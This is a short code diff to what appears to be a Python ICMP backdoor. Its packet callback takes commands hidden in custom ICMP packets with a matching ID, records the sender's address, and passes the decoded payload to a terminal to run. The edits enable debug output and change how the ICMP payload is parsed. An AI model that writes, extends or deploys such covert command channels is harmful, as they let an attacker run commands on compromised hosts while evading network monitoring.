@@ -17,7 +17,7 @@ from opening_terminal import p
 
 destination_mac = "ff:ff:ff:ff:ff:ff"
 destination_ip = ""
-is_debug = 0
+is_debug = 1
 
 
 def readstdout():
@@ -52,11 +52,10 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if hasattr(packet, 'CustomICMP'):
-        if packet[CustomICMP].id == config.ID:
+    if packet[CustomICMP].id == config.ID:
             destination_ip = packet[IP].src
             destination_mac = packet[Ether].src
-            received_data = packet[ICMP].payload.load.decode('utf-8')
+            received_data = packet[CustomICMP].payload.load.decode('utf-8')
             print("-----+ OUT DATA +-----")
             sendcommand(received_data)
 
